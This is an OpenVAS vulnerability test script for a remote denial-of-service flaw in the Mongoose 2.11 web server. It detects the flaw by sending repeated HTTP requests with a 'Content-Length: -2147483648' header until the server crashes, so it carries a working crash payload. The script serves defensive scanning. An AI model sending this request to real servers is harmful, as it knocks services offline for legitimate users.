###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mongoose_45602.nasl 13 2013-10-27 12:16:33Z jan $
#
# Mongoose 'Content-Length' HTTP Header Remote Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Mongoose is prone to a remote denial-of-service vulnerability because
it fails to handle specially crafted input.

Successfully exploiting this issue will allow an attacker to crash the
affected application, denying further service to legitimate users.

Mongoose 2.11 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103004);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)");
 script_bugtraq_id(45602);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_name("Mongoose 'Content-Length' HTTP Header Remote Denial Of Service Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45602");
 script_xref(name : "URL" , value : "http://www.johnleitch.net/Vulnerabilities/Mongoose.2.11.Denial.Of.Service/74");
 script_xref(name : "URL" , value : "http://mongoose.googlecode.com/files/mongoose-2.11.exe");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if Mongoose is prone to a remote denial-of-service vulnerability");
 script_category(ACT_DENIAL);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 8080);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

if(http_is_dead(port:port))exit(0);

banner = get_http_banner(port: port);
if(!banner || "Server:" >< banner)exit(0);

for(i=0; i<50; i++) {

  soc = open_sock_tcp(port);
  send(socket:soc,data:string("GET / HTTP/1.1\r\nHost:",get_host_name(),"\r\nContent-Length: -2147483648\r\n\r\n"));
  close(soc);

  if(http_is_dead(port:port)) {
    security_warning(port:port);
    exit(0);
  }  
}
exit(0);
